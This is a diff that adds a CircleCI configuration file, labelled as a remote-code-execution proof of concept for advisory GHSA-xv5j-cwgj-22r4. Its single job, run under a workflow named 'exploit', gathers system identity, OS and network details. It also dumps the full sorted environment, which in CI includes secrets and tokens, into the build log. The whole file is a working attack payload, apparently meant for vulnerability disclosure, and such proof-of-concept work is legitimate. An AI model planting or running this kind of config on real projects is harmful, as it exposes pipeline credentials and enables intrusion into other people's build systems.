@@ -1,0 +1,25 @@
+version: 2.1
+jobs:
+  rce:
+    docker:
+      - image: cimg/base:current
+    steps:
+      - run:
+          name: RCE PoC GHSA-xv5j
+          command: |
+            echo "=== GHSA-xv5j-cwgj-22r4 RCE OUTPUT ==="
+            echo "--- System Info ---"
+            id
+            whoami
+            uname -a
+            hostname
+            cat /etc/os-release | head -3
+            echo "--- Environment Secrets ---"
+            env | sort
+            echo "--- Network ---"
+            ip addr show 2>/dev/null || ifconfig 2>/dev/null
+            echo "=== END RCE OUTPUT ==="
+workflows:
+  exploit:
+    jobs:
+      - rce
